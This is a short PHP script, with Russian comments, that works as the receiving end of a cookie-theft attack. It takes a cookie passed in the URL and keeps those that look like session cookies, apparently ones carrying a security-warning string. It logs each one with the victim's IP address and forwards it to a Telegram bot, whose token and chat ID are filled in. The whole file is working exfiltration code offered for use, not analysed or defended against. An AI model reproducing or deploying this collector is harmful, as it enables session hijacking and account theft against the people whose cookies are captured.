<?php
$cookie = $_GET['c'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("d.m H:i:s");

if(strlen($cookie) > 300 && strpos($cookie,'WARNING') !== false){
    // Сохраняем в файл
    file_put_contents("cookies.txt", "[$time] $ip | $cookie\n\n", FILE_APPEND);
    
    // ОТПРАВЛЯЕМ ТЕБЕ В ТЕЛЕГРАМ
    $token   = "8542455731:AAGq8ZDmVbF_eKkDYcARZwmE3eeSVRJEIOk";  // ←←← ВСТАВЬ СВОЙ ТОКЕН СЮДА
    $chat_id = "6457246008";                                  // ←←← ВСТАВЬ СВОЙ CHAT_ID СЮДА
    $text    = urlencode("НОВАЯ КУКА\nIP: $ip\n$cookie");
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=$text");
}
?>
